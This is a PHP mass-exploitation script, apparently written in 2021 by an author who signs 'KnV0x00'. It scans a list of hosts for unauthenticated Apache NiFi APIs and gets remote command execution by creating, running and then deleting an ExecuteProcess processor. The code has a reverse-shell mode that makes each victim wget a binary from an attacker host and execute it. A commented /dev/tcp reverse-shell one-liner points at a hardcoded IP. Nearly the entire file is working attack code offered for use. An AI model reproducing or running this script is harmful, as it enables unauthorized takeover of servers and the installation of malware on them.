<?php
    class exploit{
        public function __construct($file,$porta,$cmd, $cmdt)
        {
            $result = $this->getaddress($file,$porta,$cmd,$cmdt);
            if($result == 1){
                printf("\033[01;37m[\033[1;31mSTDERR\033[01;37m] \033[1;31mErro ao tentar obter o group id!\033[0m\n");
                exit(1);
            }
        }
        public function getaddress($file, $porta, $cmd,$cmdt){
            if(file_exists($file)){
                $file_handle = fopen($file, "r");
                while (!feof($file_handle)) {
                   $line = fgets($file_handle);
                   $line=str_replace("\n","",$line);
                   if(strlen($line) < 3) continue;
                   $result = $this->checker($line, $porta);
                   if($result == 0){
                    $this->isvuln($line,$porta);
                    $result = $this->exploit($line,$porta,$cmd,$cmdt);
                    }
                    printf("\n\n\n");
                }
            }
            fclose($file_handle);
        }
        public function isvuln($url,$porta){
            $file = "is_vuln.txt";
            $file_handle = fopen($file, "a");
                if($file_handle){
                    printf("\033[01;37m[\033[1;33mINFO\033[01;37m]\033[1;33m ESCREVENDO EM UM ARQUIVO...\n\033[0m");
                    if(!fwrite($file_handle, "$url:$porta\n"));
                }
        }
        public function checker($urlv, $porta)
        {
           
            $url = "$urlv:$porta/nifi-api/access/config";
            $ch = curl_init($url);
            curl_setopt($ch , CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch , CURLOPT_SSL_VERIFYPEER, true);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        
            $response = curl_exec($ch);
            curl_close($ch);
            $data = json_decode($response, true);
            if(isset($data['config']['supportsLogin']) == false){
                printf("\033[01;37m[\033[1;31mSTDERR\033[01;37m] \033[1;31mO HOST $urlv:$porta NÃO É VULNERAVEL!\n\033[0m");
                return 1;
            }
            printf("\033[01;37m[\033[0;32mSTDOUT\033[01;37m] \033[0;32mO HOST $urlv:$porta É VULNERAVEL\n\033[0m");
            printf("\033[01;37m[\033[1;33mINFO\033[01;37m]\033[1;33m TENTANDO OBTER ACESSO...\n\033[0m");
            return 0;
        }
        public function crt_processo($urlv,$porta,$g_id){
            printf("\033[01;37m[\033[1;33mINFO\033[01;37m] \033[1;33mCRIANDO O PROCESSO!\n");

            $url = "$urlv:$porta/nifi-api/process-groups/$g_id/processors";
            
            $data = '{"component": {"type": "org.apache.nifi.processors.standard.ExecuteProcess"}, "revision": {"version": 0}}';

            $payload = json_encode($data);
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch , CURLOPT_SSL_VERIFYPEER, true);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));

            
            $response = curl_exec($ch);
            $p_response = json_decode($response, true);
            return $p_response['id'];
            curl_close($ch);
        }

        public function exploit($url,$port,$cmd,$cmdt){
            $g_id = $this->group_id($url,$port, $cmd);
            if(!$g_id == false){
                $p_id = $this->crt_processo($url,$port,$g_id);
                if(!$p_id == false){
                    $response = $this->run_cmdv($url,$port, $p_id, $cmd, $cmdt);
                    $rxt = $this->clean_up($url,$port,$p_id);
                    if($response == 1){
                        printf("\033[01;37m[\033[1;31mSTDERR\033[01;37m] \033[1;31mERRO AO TENTAR ACESSAR A MAQUINA!\033[0m");
                    }
                    printf("\n\n\n");
                }
                
            }
        }
        public function clean_up($urlv,$portv,$p_id){
            $url = "$urlv:$portv/nifi-api/processors/$p_id/run-status";
            $url2 = "$urlv:$portv/nifi-api/processors/$p_id/threads";
            $data = '{"revision": {"clientId": "x", "version": 1}, "state": "STOPPED"}';
            $ch = curl_init();
                
                curl_setopt($ch, CURLOPT_URL,            $url);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));
                curl_setopt($ch, CURLOPT_POSTFIELDS,     $data);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                curl_setopt($ch, CURLOPT_TIMEOUT, 3);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_POST,           true);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,  'PUT');
                
                $resposta = curl_exec($ch);
                
            curl_close($ch);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL,            $url2);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST,  "DELETE");
            $resposta = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            return 0;
        }
        public function run_cmdv($urlv, $portv, $p_idv, $cmdv, $cmdt){
            try {
                printf("\033[01;37m[\033[0;32mSTDOUT\033[01;37m]\033[0;32mCOMANDO EXECUTADO!\n\033[0m");
                $url = "http://$urlv:$portv/nifi-api/processors/$p_idv";
                $data =  '{"component": {"config": {"autoTerminatedRelationships": ["success"], "properties": {"Command": "'.$cmdv.'", "Command Arguments": "'.$cmdt.'" }, "schedulingPeriod": "3600 sec"}, "id": "'.$p_idv.'", "state": "RUNNING"}, "revision": {"clientId": "x", "version": 1}}';
                
                $ch = curl_init();
                
                curl_setopt($ch, CURLOPT_URL,            $url);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));
                curl_setopt($ch, CURLOPT_POSTFIELDS,     $data);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
                curl_setopt($ch, CURLOPT_TIMEOUT, 3);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_POST,           true);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,  'PUT');
                
                $resposta = curl_exec($ch);
                
                curl_close($ch);
                return 0;

            } catch (Exception $e) {
                return 1;
            }
        }

        public function group_id($url,$port){
            $url = "$url:$port/nifi-api/process-groups/root";
            try {
                $ch = curl_init($url);
            
                curl_setopt($ch , CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch , CURLOPT_SSL_VERIFYPEER, true);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
            
                $response = curl_exec($ch);
                curl_close($ch);
                $data = json_decode($response, true);
                $retrunz = $data['status']['id'];
                return $retrunz;

            } catch (Exception $e) {
                return 1;
            }
        }

    }

    if($argc < 5){
    	printf(">By KnV0x00 20/05/2021 22:05[\n");
        print("Execute: $argv[0] <file> <rport> <cmd> <args> [optional=> lhost=<host> lport=<port>]\n");
        printf("Exemplos:\n\t Exec cmd: $argv[0] host.txt 8080 'wget' 'www.github.com/KnV0x00'\n\t Rev shell: $argv[0] host.txt 8080 'NULL' 'NULL' 192.168.0.103 4444\n");
        return 1;
    }
    if($argc > 5) {
        if($argc == 7){
            //exec 5<>/dev/tcp/177.8.48.0/8080; while read line 0<&5; do $line 2>&5 >&5; done
            $argv[3] = "wget";
            $argv[4] = "http://$argv[5]:$argv[6]/lnx64 && chmod 777 lnx64 && ./lnx64 &";
        }
    }
    printf("\033[01;37m[\033[1;33m+\033[01;37m]\033[01;37m---------------------------------------------\033[01;37m[\033[1;33m+\033[01;37m]\033[0m\n");
    printf("     \033[1;36mARQUIVO:\033[0m $argv[1]\n");
    printf("     \033[1;36mPORTA..:\033[0m $argv[2]\n");
    printf("     \033[1;36mCOMANDO:\033[0m $argv[3] $argv[4]\n");
    printf("\033[01;37m[\033[1;33m+\033[01;37m]\033[01;37m---------------------------------------------\033[01;37m[\033[1;33m+\033[01;37m]\033[0m\n");
    $result = new exploit($argv[1], $argv[2], $argv[3], $argv[4]);

?>
